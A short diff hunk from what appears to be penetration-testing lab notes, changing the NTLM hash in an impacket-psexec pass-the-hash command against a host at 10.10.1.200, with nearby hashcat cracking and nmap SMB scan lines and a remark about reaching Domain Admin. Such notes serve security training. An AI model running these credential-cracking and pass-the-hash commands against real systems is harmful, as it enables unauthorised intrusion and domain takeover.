@@ -471,7 +471,7 @@ hashcat hashes /usr/share/wordlists/rockyou.txt -m 1000 -r /usr/share/hashcat/ru
 
 sudo nmap -Pn -v -p445 10.10.1.200
 
-impacket-psexec -hashes :42hjk1hk341jh2314hk1jlk234 gru@10.10.1.200
+impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd gru@10.10.1.200
 whoami
 (We are Domain Admin!)
 hostname
